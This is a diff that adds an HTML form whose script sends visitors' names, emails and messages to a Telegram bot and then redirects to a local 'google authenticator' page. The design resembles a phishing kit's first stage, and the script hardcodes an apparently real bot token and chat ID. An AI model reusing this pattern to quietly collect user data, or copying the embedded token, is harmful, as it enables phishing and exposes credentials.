@@ -1,0 +1,31 @@
+<form id="telegramForm" action="file:///C:/Users/HP650/Desktop/google%20authenticator.html">
+    <input type="text" id="name" placeholder="Your Name" required>
+    <input type="email" id="email" placeholder="Your Email" required>
+    <textarea id="message" placeholder="Your Message" required></textarea>
+    <button type="submit">Next</button>
+</form>
+
+<script>
+document.getElementById("telegramForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    let name = document.getElementById("name").value;
+    let email = document.getElementById("email").value;
+    let message = document.getElementById("message").value;
+
+    let botToken = "8022682561:AAEsak6S1bdhFFaSAoWkg9IDU2FZdZ2bXB8"; // Replace with your actual bot token
+    let chatId = "7773839221"; // Replace with your actual chat ID
+    let text = `Name: ${name}\nEmail: ${email}\nMessage: ${message}`;
+
+    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+    fetch(url)
+        .then(() => {
+            window.location.href = "file:///C:/Users/HP650/Desktop/google%20authenticator.html"; // Redirect after sending
+        })
+        .catch(error => {
+            console.error("Error sending message:", error);
+            window.location.href = "file:///C:/Users/HP650/Desktop/google%20authenticator.html"; // Redirect even if Telegram fails
+        });
+});
+</script>
